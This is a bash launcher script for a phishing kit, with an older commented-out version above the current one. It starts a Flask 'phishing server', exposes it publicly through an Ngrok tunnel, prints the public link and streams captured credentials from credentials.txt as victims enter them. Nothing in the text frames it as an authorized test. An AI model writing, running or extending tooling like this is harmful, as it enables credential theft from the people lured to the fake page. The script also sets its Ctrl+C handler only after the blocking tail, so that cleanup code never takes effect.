# #!/bin/bash

# # Kill existing Flask app if running
# pkill -f app.py

# # Activate venv (bash-compatible)
# source venv/bin/activate

# # Clear old logs
# > credentials.txt

# # Start Flask app
# echo "[*] Starting phishing server..."
# python3 app.py &
# APP_PID=$!
# sleep 2

# echo "[*] Server is running at: http://127.0.0.1:8080"
# echo "[*] Waiting for credentials..."
# tail -f credentials.txt

# # Handle Ctrl+C clean exit
# trap ctrl_c INT
# function ctrl_c() {
#   echo -e "\n[!] Stopping server..."
#   kill $APP_PID
#   deactivate
#   exit 0
# }




#!/bin/bash

# Kill any existing Flask and Ngrok processes
pkill -f app.py
pkill -f ngrok

# Activate virtual environment
source venv/bin/activate

# Clear old credentials
> credentials.txt

# Start Flask server
echo "[*] Starting phishing server..."
python3 app.py &
APP_PID=$!
sleep 2

# Start Ngrok tunnel
echo "[*] Launching Ngrok tunnel..."
ngrok http 8080 > /dev/null &
sleep 3

# Get Ngrok public URL
NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -Po '"public_url":"https://[^"]*' | sed 's/"public_url":"//')

echo "[*] Server running at: http://127.0.0.1:8080"
echo "[*] Ngrok public link: $NGROK_URL"
echo "[*] Waiting for credentials..."

# Live credentials output
tail -f credentials.txt

# Ctrl+C trap
trap ctrl_c INT
function ctrl_c() {
  echo -e "\\n[!] Shutting down..."
  kill $APP_PID
  pkill -f ngrok
  deactivate
  exit 0
}
